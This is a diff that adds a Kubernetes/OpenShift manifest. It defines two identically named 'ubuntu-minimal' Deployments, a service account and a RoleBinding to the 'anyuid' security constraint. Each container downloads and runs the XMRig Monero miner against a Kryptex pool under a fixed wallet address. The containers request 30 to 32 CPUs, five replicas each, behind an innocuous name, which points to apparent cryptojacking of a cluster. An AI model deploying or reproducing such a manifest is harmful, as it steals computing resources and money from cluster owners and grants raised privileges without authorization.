@@ -1,0 +1,86 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ubuntu-minimal-deployment
+spec:
+  replicas: 5
+  selector:
+    matchLabels:
+      app: ubuntu-minimal
+  template:
+    metadata:
+      labels:
+        app: ubuntu-minimal
+    spec:
+      serviceAccountName: ubuntu-sa  # Use the ubuntu-sa service account
+      containers:
+      - name: ubuntu
+        image: ubuntu:20.04
+        command: [ "sh", "-c", "apt-get update && apt-get install -y wget tar && wget -c https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz -P /mnt/data && tar -xzvf /mnt/data/xmrig-6.22.2-linux-static-x64.tar.gz -C /mnt/data && cd /mnt/data && ./xmrig -o xmr.kryptex.network:7777 -u 49sVbUmckBtEiMtQBDp3yTbZz9t2fb5UFQ4iBAABSiXQ4SAvz71azEpe7BcfsmGCCDXPKy7HgsDamApdRfUh2MrS6sgZZ8t/worker-ocs-2 -k --coin monero -a rx/0 " ]
+        resources:
+          limits:
+            cpu: '32'
+            memory: 20Gi
+          requests:
+            cpu: '30'
+            memory: 10Gi
+        volumeMounts:
+          - name: ubuntu-ephemeral
+            mountPath: /mnt/data
+      volumes:
+        - name: ubuntu-ephemeral  # Using ephemeral storage instead of PVC
+          emptyDir: {}  # emptyDir creates a temporary directory that is erased when the pod is removed
+
+---
+kind: ServiceAccount
+apiVersion: v1
+metadata:
+  name: ubuntu-sa
+  namespace: ubuntu
+---
+kind: RoleBinding
+apiVersion: rbac.authorization.k8s.io/v1
+metadata:
+  name: 'system:openshift:scc:anyuid'
+  namespace: ubuntu
+subjects:
+  - kind: ServiceAccount
+    name: ubuntu-sa
+    namespace: ubuntu
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: 'system:openshift:scc:anyuid'
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ubuntu-minimal-deployment
+spec:
+  replicas: 5
+  selector:
+    matchLabels:
+      app: ubuntu-minimal
+  template:
+    metadata:
+      labels:
+        app: ubuntu-minimal
+    spec:
+      serviceAccountName: ubuntu-sa  # Use the ubuntu-sa service account
+      containers:
+      - name: ubuntu
+        image: ubuntu:20.04
+        command: [ "sh", "-c", "apt-get update && apt-get install -y wget tar && wget -c https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-22-2/xmrig-6.22.2-linux-static-x64.tar.gz -P /mnt/data && tar -xzvf /mnt/data/xmrig-6.22.2-linux-static-x64.tar.gz -C /mnt/data && cd /mnt/data && ./xmrig -o xmr.kryptex.network:7777 -u 49sVbUmckBtEiMtQBDp3yTbZz9t2fb5UFQ4iBAABSiXQ4SAvz71azEpe7BcfsmGCCDXPKy7HgsDamApdRfUh2MrS6sgZZ8t/worker-R -k --coin monero -a rx/0 " ]
+        resources:
+          limits:
+            cpu: '32'
+            memory: 20Gi
+          requests:
+            cpu: '30'
+            memory: 10Gi
+        volumeMounts:
+          - name: ubuntu-ephemeral
+            mountPath: /mnt/data
+      volumes:
+        - name: ubuntu-ephemeral  # Using ephemeral storage instead of PVC
+          emptyDir: {}  # emptyDir creates a temporary directory that is erased when the pod is removed
